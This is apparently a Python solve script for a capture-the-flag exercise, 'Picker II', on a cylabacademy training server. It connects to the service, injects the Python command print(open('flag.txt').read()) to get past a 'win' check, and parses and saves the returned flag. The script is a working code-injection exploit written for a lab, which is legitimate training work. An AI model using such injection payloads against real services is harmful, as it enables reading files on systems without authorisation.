#!/usr/bin/env python3
"""
Solve script for Picker II (#401)
Target: xebec.cylabacademy.net:15712
"""
import re
import socket
from pathlib import Path

def get_target_conn():
    cfg_file = Path(__file__).resolve().parent / "connection.cfg"
    host, port = "xebec.cylabacademy.net", 15712
    if cfg_file.exists():
        for line in cfg_file.read_text().splitlines():
            if line.startswith("HOST=") and line.split("=", 1)[1]:
                host = line.split("=", 1)[1].strip()
            elif line.startswith("PORT=") and line.split("=", 1)[1]:
                try:
                    port = int(line.split("=", 1)[1].strip())
                except Exception:
                    pass
    return host, port

def solve():
    host, port = get_target_conn()
    print(f"[*] Connecting to {host}:{port}...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5.0)
    s.connect((host, port))
    
    # Wait for prompt
    data = b""
    while b"==> " not in data:
        chunk = s.recv(1024)
        if not chunk:
            break
        data += chunk
    
    # Send payload that bypasses 'win' check and prints the flag
    s.sendall(b"print(open('flag.txt').read())\n")
    
    # Collect response
    resp = b""
    while True:
        try:
            chunk = s.recv(1024)
            if not chunk:
                break
            resp += chunk
        except socket.timeout:
            break
    s.close()
    
    output = resp.decode(errors="ignore")
    match = re.search(r"academy\{[^}]+\}", output)
    if match:
        flag = match.group(0)
        print(f"[+] Flag found: {flag}")
        flag_path = Path(__file__).resolve().parent / "flag.txt"
        flag_path.write_text(flag)
        return flag
    else:
        print("[-] Flag not found in output:")
        print(output)
        return None

if __name__ == "__main__":
    solve()
